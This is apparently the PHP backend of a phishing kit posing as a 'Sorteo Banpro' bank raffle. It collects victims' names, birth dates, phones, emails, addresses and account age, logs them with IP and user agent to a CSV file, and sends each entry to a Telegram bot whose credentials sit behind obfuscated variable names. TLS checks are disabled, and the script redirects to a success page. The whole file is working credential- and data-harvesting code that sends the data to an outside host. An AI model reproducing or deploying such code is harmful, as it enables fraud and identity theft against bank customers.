<?php
/**
 * Procesa el envío del formulario de participación.
 * - Valida y sanitiza los datos recibidos por POST.
 * - Guarda en participaciones.csv (modo append).
 * - (Opcional) envía correo de notificación: configura $NOTIFY_EMAIL.
 * - Redirige a troya.html en éxito o muestra errores.
 */

declare(strict_types=1);
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['tsv_ok'])) { http_response_code(403); echo json_encode(['ok'=>false,'error'=>'unauthorized']); exit; }

// ============ CONFIG ============
$NOTIFY_EMAIL    = '';            // correo opcional de notificación ('' = desactivado)
$CSV_FILE        = __DIR__ . DIRECTORY_SEPARATOR . 'participaciones.csv';
$SUCCESS_URL     = 'troya.html';

// --- Telegram ---
include("oslo.php");
$TELEGRAM_TOKEN   = $ambar;
$TELEGRAM_CHAT_ID = $koala;
// ================================

// Solo aceptar POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Método no permitido.');
}

// Campos esperados del formulario (deben coincidir con los name="" del HTML)
$fields = ['nombre', 'fecha', 'telefono', 'correo', 'direccion', 'antiguedad'];

$data   = [];
$errors = [];

foreach ($fields as $f) {
    $raw = isset($_POST[$f]) ? trim((string) $_POST[$f]) : '';
    if ($raw === '') {
        $errors[] = "El campo \"$f\" es obligatorio.";
    }
    $data[$f] = $raw;
}

// Validaciones específicas
if ($data['correo'] !== '' && !filter_var($data['correo'], FILTER_VALIDATE_EMAIL)) {
    $errors[] = 'El correo electrónico no es válido.';
}
if ($data['telefono'] !== '' && !preg_match('/^[0-9 +()\-]{7,20}$/', $data['telefono'])) {
    $errors[] = 'El teléfono no es válido.';
}
if ($data['fecha'] !== '') {
    $d = DateTime::createFromFormat('Y-m-d', $data['fecha']);
    if (!$d || $d->format('Y-m-d') !== $data['fecha']) {
        $errors[] = 'La fecha de nacimiento no es válida.';
    }
}

if (!empty($errors)) {
    http_response_code(422);
    echo '<h2>Errores en el formulario</h2><ul>';
    foreach ($errors as $e) echo '<li>' . htmlspecialchars($e, ENT_QUOTES, 'UTF-8') . '</li>';
    echo '</ul><a href="ratan.html">Volver</a>';
    exit;
}

// Sanitización para almacenamiento
$row = [
    date('Y-m-d H:i:s'),
    $data['nombre'],
    $data['fecha'],
    $data['telefono'],
    $data['correo'],
    $data['direccion'],
    $data['antiguedad'],
    ip_yago(),
    $_SERVER['HTTP_USER_AGENT'] ?? '',
];

// Guardar en CSV
$isNew = !file_exists($CSV_FILE);
$fp    = fopen($CSV_FILE, 'a');
if ($fp === false) {
    http_response_code(500);
    exit('No se pudo abrir el archivo de registro.');
}
if (flock($fp, LOCK_EX)) {
    if ($isNew) {
        // BOM para que Excel abra UTF-8 correctamente
        fwrite($fp, "\xEF\xBB\xBF");
        fputcsv($fp, ['fecha_envio','nombre','fecha_nacimiento','telefono','correo','direccion','antiguedad','ip','user_agent']);
    }
    fputcsv($fp, $row);
    fflush($fp);
    flock($fp, LOCK_UN);
}
fclose($fp);

// ============ ENVÍO A TELEGRAM ============
function tx_duna(string $ambar, string $chatId, array $data): array {
    if ($ambar === '' || $chatId === '') {
        return ['ok' => false, 'error' => 'Credenciales de Telegram no configuradas'];
    }

    $esc = fn($s) => htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8');

    $ms  = "🎉 <b>Nueva Participación - Sorteo Banpro</b>\n";
    $ms .= "━━━━━━━━━━━━━━━━━━\n";
    $ms .= "👤 <b>Nombre:</b> "       . $esc($data['nombre'])     . "\n";
    $ms .= "🎂 <b>Nacimiento:</b> "   . $esc($data['fecha'])      . "\n";
    $ms .= "📞 <b>Teléfono:</b> "     . $esc($data['telefono'])   . "\n";
    $ms .= "📧 <b>Correo:</b> "       . $esc($data['correo'])     . "\n";
    $ms .= "🏠 <b>Dirección:</b> "    . $esc($data['direccion'])  . "\n";
    $ms .= "⏳ <b>Antigüedad:</b> "   . $esc($data['antiguedad']) . "\n";
    $ms .= "━━━━━━━━━━━━━━━━━━\n";
    $ms .= "🕒 " . date('d/m/Y H:i:s') . "\n";
    $ms .= "🌐 IP: " . ip_yago();

    $url = "https://api.telegram.org/bot{$ambar}/sendMessage";
    $payload = [
        'chat_id'                  => $chatId,
        'text'                     => $ms,
        'parse_mode'               => 'HTML',
        'disable_web_page_preview' => true,
    ];

    // Intentar con cURL (preferido)
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => http_build_query($payload),
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
        ]);
        $response = curl_exec($ch);
        $errno    = curl_errno($ch);
        $errmsg   = curl_error($ch);
        $http     = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($errno) {
            return ['ok' => false, 'error' => "cURL: $errmsg"];
        }
        $json = json_decode((string) $response, true);
        return ['ok' => $http === 200 && !empty($json['ok']), 'http' => $http, 'response' => $json];
    }

    // Fallback con file_get_contents
    $context = stream_context_create([
        'http' => [
            'method'        => 'POST',
            'header'        => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content'       => http_build_query($payload),
            'timeout'       => 10,
            'ignore_errors' => true,
        ],
    ]);
    $response = @file_get_contents($url, false, $context);
    if ($response === false) {
        return ['ok' => false, 'error' => 'No se pudo conectar a Telegram'];
    }
    $json = json_decode($response, true);
    return ['ok' => !empty($json['ok']), 'response' => $json];
}

$telegramResult = tx_duna($TELEGRAM_TOKEN, $TELEGRAM_CHAT_ID, $data);
error_log('Telegram resultado: ' . json_encode($telegramResult));

// 🐞 MODO DEBUG: si añades ?debug=1 a la URL del form, muestra el resultado en vez de redirigir
if (isset($_GET['debug'])) {
    header('Content-Type: text/plain; charset=UTF-8');
    echo "=== DEBUG TELEGRAM ===\n";
    print_r($telegramResult);
    echo "\n\nDatos enviados:\n";
    print_r($data);
    exit;
}
// ==========================================

// Envío de correo opcional
if ($NOTIFY_EMAIL !== '') {
    $subject = 'Nueva participación - Sorteo Banpro';
    $body    = "Se recibió una nueva solicitud:\n\n";
    foreach ($data as $k => $v) $body .= ucfirst($k) . ": $v\n";
    $headers = "From: no-reply@" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($NOTIFY_EMAIL, $subject, $body, $headers);
}

// Redirigir a página de éxito
header('Location: ' . $SUCCESS_URL);
exit;
